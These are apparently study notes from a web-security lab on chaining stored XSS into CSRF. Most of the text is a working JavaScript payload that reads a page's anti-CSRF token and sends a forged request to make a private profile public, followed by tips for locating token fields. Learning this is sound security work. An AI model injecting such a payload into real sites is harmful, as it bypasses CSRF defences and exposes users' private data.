We can still perform a CSRF attack through the stored XSS vulnerability that exists. Specifically, we will leverage the stored XSS vulnerability to issue a state-changing request against the web application. A request through XSS will bypass any same origin/same site protection since it will derive from the same domain!
Let us target the Change Visibility request because a successful CSRF attack targeting Change Visibility can cause the disclosure of a private profile.
`<script>`
`var req = new XMLHttpRequest();`
`req.onload = handleResponse;`
`req.open('get','/app/change-visibility',true);`
`req.send();`
`function handleResponse(d) {`
    `var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];`
    `var changeReq = new XMLHttpRequest();`
    `changeReq.open('post', '/app/change-visibility', true);`
    `changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');`
    `changeReq.send('csrf='+token+'&action=change');`
`};`
`</script>`
Note: If no result is returned and you are certain that CSRF tokens are in place, look through various bits of the source code or copy your current CSRF token and look for it through the search functionality. This way, you may uncover the input field name you are looking for. If you still get no results, this doesn't mean that the application employs no anti-CSRF protections. There could be another form that is protected by an anti-CSRF protection.
Check notion for the details